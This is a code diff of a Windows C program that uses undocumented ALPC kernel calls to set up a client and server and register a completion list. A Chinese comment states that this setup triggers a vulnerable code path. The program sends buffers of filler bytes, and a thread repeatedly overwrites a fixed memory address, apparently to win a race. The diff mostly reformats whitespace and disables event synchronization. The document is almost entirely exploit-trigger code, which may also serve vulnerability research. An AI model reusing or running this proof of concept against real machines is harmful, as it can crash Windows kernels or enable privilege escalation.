@@ -209,8 +209,6 @@ PORT_MESSAGE     pmReceived = { 0 };
 
 void th() {
 
-
-	
 	while (true)
 	{
 		*(USHORT*)(0x304002) = 0xffff;
@@ -222,15 +220,15 @@ INT main()
 // DEFINITIONS
 //
 	NTSTATUS lSuccess;
-	HANDLE hCommunicationPort= NULL;
+	HANDLE hCommunicationPort = NULL;
 	UNICODE_STRING usAlpcPortName;
 	OBJECT_ATTRIBUTES objAttributes;
 	ALPC_PORT_ATTRIBUTES PortAttributes;
 	SECURITY_QUALITY_OF_SERVICE SecurityQos;
-	
+
 	SIZE_T ulReceivedSize = MSG_LEN;
 	PALPC_MESSAGE_ATTRIBUTES pMsgAttrSend;
-	
+
 	LPCWSTR pwsPortName = L"\\RPC Control\\CSALPCPort"; // the name of the ALPC port we're creating
 	CS_PORT_CONTEXT portContext;
 	UUID uuid;
@@ -256,8 +254,8 @@ INT main()
 	PortAttributes.MaxPoolUsage = 0xffffffff; // 0x4000;
 	RtlSecureZeroMemory(&SecurityQos, sizeof(SecurityQos));
 	PortAttributes.SecurityQos = SecurityQos;
-	
-	
+
+
 	// 
 	// CREATE PORT
 	//
@@ -269,7 +267,7 @@ INT main()
 		NULL,				// no root directry handle as our port name is a full qualified path
 		NULL//pSD				// security descriptor
 	);
-	
+
 	handle = OpenEventW(EVENT_ALL_ACCESS, 0, L"Global\\hi");
 	//如果没有打开事件成功说明没有创建alpc端口 说明自身是服务端 然后再创建一个客户端进程
 	if (!handle) {
@@ -304,9 +302,9 @@ INT main()
 			exit(-1);
 		}
 		else wprintf(L"[+] ZwCreateSection Success, Section created. Size: %x\n", SectionSize);
-		
 
-		
+
+
 		HANDLE hServerSection;
 		SIZE_T nServerSectionSize;
 		lSuccess = NtAlpcCreatePortSection(
@@ -325,9 +323,9 @@ INT main()
 
 		ALPC_DATA_VIEW_ATTR adva = { 0 };
 
-	
-	
-				
+
+
+
 		adva.Flags = 0;	//unknown
 		adva.SectionHandle = hServerSection;
 		adva.ViewBase = NULL;
@@ -351,7 +349,7 @@ INT main()
 		ALPC_PORT_COMPLETION_LIST_INFORMATION CompletionList = { 0 };
 		PALPC_COMPLETION_LIST_HEADER CompletionListHEADER = { 0 };
 		CompletionListHEADER = (PALPC_COMPLETION_LIST_HEADER)test2;
-	
+
 		CompletionList.Buffer = CompletionListHEADER;
 		CompletionList.Buffer->StartMagic = 0x1000;
 		CompletionList.Size = 0x10000;
@@ -367,16 +365,16 @@ INT main()
 			*((_DWORD*)v11 + 4),			     CompletionList.AttributeFlags
 			v8);*/
 
-		//消息标志不能为空 否则无法触发漏洞代码路径
+			//消息标志不能为空 否则无法触发漏洞代码路径
 		CompletionList.AttributeFlags = ALPC_MESSAGE_SECURITY_ATTRIBUTE;
 
 		lSuccess = NtAlpcSetInformation(hConnectionPort, AlpcRegisterCompletionListInformation, &CompletionList, 24);
 		if (!NT_SUCCESS(lSuccess)) {
-				wprintf(L"[-] NtAlpcSetInformation Error: 0x%X\n", lSuccess);
-				exit(-1);
+			wprintf(L"[-] NtAlpcSetInformation Error: 0x%X\n", lSuccess);
+			exit(-1);
 		}
 		else wprintf(L"[+] NtAlpcSetInformation Success.\n");
-		
+
 
 		//DumpHex((PVOID)(buf+ CompletionListHEADER->DataOffset), 0x100);
 
@@ -386,7 +384,7 @@ INT main()
 
 		char szModule[MAX_PATH];
 		GetModuleFileNameA(NULL, szModule, MAX_PATH);
-		
+
 		BOOL success = CreateProcessA(
 			NULL,
 			(LPSTR)szModule,
@@ -415,7 +413,7 @@ INT main()
 			NULL			// no timeout
 		);
 
-		
+
 		lSuccess = NtAlpcAcceptConnectPort(
 			&hCommunicationPort,		// Communication port handle
 			hConnectionPort,			// Connection port handle
@@ -440,8 +438,8 @@ INT main()
 		while (true)
 		{
 
-			WaitForSingleObject(handle, INFINITE);
-			ResetEvent(handle);
+			/*WaitForSingleObject(handle, INFINITE);
+			ResetEvent(handle);*/
 
 			lSuccess = NtAlpcSendWaitReceivePort(
 				hConnectionPort,
@@ -453,66 +451,66 @@ INT main()
 				pMsgAttrReceived,//&test,		// ReceiveMessageAttributes
 				NULL			// no timeout
 			);
-		
+
 			adder = CompletionList.Buffer->DataOffset;
 			ULONG type = *(ULONG*)(test + CompletionList.Buffer->DataOffset + 4);
-			
-			
 
 
-		    //一般情况下使用lpMem->u2.s2.Type判断消息类型
-		    //完成列表由于是异步 所以要使用事件通知辅助来通信
-			switch (type)
-			{
-				
-				//Client disconnects
-				case 0x5:
-					wprintf(L"[*] Client disconnects\n");
-					NtAlpcDisconnectPort(hCommunicationPort, 0);
-					NtAlpcDisconnectPort(hConnectionPort, 0);
-					break;
-				//Client sends message
-				case 0x2001:
-				
-					wprintf(L"[*] CompletionList.Buffer->DataOffset  %x \n", CompletionList.Buffer->DataOffset);
-					
-					DumpHex((ULONG*)(test + CompletionList.Buffer->DataOffset), 0x50);
-					wprintf(L"---------------------------------\n");
-					if (!NT_SUCCESS(lSuccess)) {
-						wprintf(L"[-] Accept client messages Error: 0x%X\n", lSuccess);
-						exit(-1);
-					}
-					else wprintf(L"[+] Accept client message successfully \n", pwsPortName);
-		
-					//wprintf(L"[+]%x\n", CompletionList.AttributeFlags);
-					break;
-				
-			}
-		
+
+
+			//一般情况下使用lpMem->u2.s2.Type判断消息类型
+			//完成列表由于是异步 所以要使用事件通知辅助来通信
+			//switch (type)
+			//{
+
+			//	//Client disconnects
+			//case 0x5:
+			//	wprintf(L"[*] Client disconnects\n");
+			//	NtAlpcDisconnectPort(hCommunicationPort, 0);
+			//	NtAlpcDisconnectPort(hConnectionPort, 0);
+			//	break;
+			//	//Client sends message
+			//case 0x2001:
+
+			//	wprintf(L"[*] CompletionList.Buffer->DataOffset  %x \n", CompletionList.Buffer->DataOffset);
+
+			//	DumpHex((ULONG*)(test + CompletionList.Buffer->DataOffset), 0x50);
+			//	wprintf(L"---------------------------------\n");
+			//	if (!NT_SUCCESS(lSuccess)) {
+			//		wprintf(L"[-] Accept client messages Error: 0x%X\n", lSuccess);
+			//		exit(-1);
+			//	}
+			//	else wprintf(L"[+] Accept client message successfully \n", pwsPortName);
+
+			//	//wprintf(L"[+]%x\n", CompletionList.AttributeFlags);
+			//	break;
+
+			//}
+
 		}
 
 	}
 	else
 	{
-		
+
 		wprintf(L"[+] Starting client. PID: %d | TID: %d\n", dwPID, dwTID);
 		DWORD           szInput[MSG_LEN + 1];
-		
-		
+
+
 		RtlSecureZeroMemory(&pmReceived, sizeof(pmReceived));
 		RtlSecureZeroMemory(&szInput, MSG_LEN);
-		memset(szInput,0x41,MSG_LEN);
-		
+		memset(szInput, 0x41, MSG_LEN);
+
 		pmReceived.u1.s1.DataLength = MSG_LEN - 0x28;
 		pmReceived.u1.s1.TotalLength = MSG_LEN;
 		PPORT_MESSAGE lpMem = CreateMsgMem(&pmReceived, pmReceived.u1.s1.DataLength, &szInput);
 		ALPC_PORT_COMPLETION_LIST_INFORMATION CompletionList = { 0 };
-		
-	
-	
-		lSuccess =  NtAlpcConnectPort(&hConnectionPort, &usAlpcPortName, 0, &PortAttributes, NULL, NULL, lpMem, NULL, NULL, NULL, NULL);
 
-		
+
+
+		lSuccess = NtAlpcConnectPort(&hConnectionPort, &usAlpcPortName, 0, &PortAttributes, NULL, NULL, lpMem, NULL, NULL, NULL, NULL);
+
+
 		if (!NT_SUCCESS(lSuccess)) {
 			wprintf(L"[-] NtAlpcConnectPort Error: 0x%X.\n", lSuccess);
 			exit(-1);
@@ -521,8 +519,8 @@ INT main()
 		else {
 			wprintf(L"[+] NtAlpcConnectPort Success.\n");
 		}
-		
-	
+
+
 		LARGE_INTEGER SectionSize = { 0x10000 };
 		HANDLE SectionHandle;
 		lSuccess = NtCreateSection(&SectionHandle,
@@ -559,20 +557,20 @@ INT main()
 		else wprintf(L"[+] NtAlpcCreatePortSection Success, Section created. Size: %x\n", nServerSectionSize);
 
 
-	
+
 
 		pMsgAttrSend = setup_sample_message_attributes(hConnectionPort, hServerSection, ALPC_MESSAGE_VIEW_ATTRIBUTE); //ALPC_MESSAGE_SECURITY_ATTRIBUTE
 		pMsgAttrSend->ValidAttributes |= ALPC_MESSAGE_VIEW_ATTRIBUTE;  // Mark an attribute as valid
 
 		memset(viewAttr.ViewBase, 0x43, MSG_LEN);
-	    lpMem = (PPORT_MESSAGE)viewAttr.ViewBase;
+		lpMem = (PPORT_MESSAGE)viewAttr.ViewBase;
 		memmove(lpMem, &pmReceived, sizeof(PORT_MESSAGE));
-//		DumpHex(viewAttr.ViewBase, 0x50);
-		//CreateThread(0, 0, (LPTHREAD_START_ROUTINE)th, 0, 0, 0);
-	
+		//		DumpHex(viewAttr.ViewBase, 0x50);
+				//CreateThread(0, 0, (LPTHREAD_START_ROUTINE)th, 0, 0, 0);
+
 		while (true)
 		{
-			SetEvent(handle);
+		//	SetEvent(handle);
 			lSuccess = NtAlpcSendWaitReceivePort(
 				hConnectionPort,
 				NULL,
@@ -604,7 +602,7 @@ INT main()
 
 
 	}
-	
+
 
 	getchar();
 
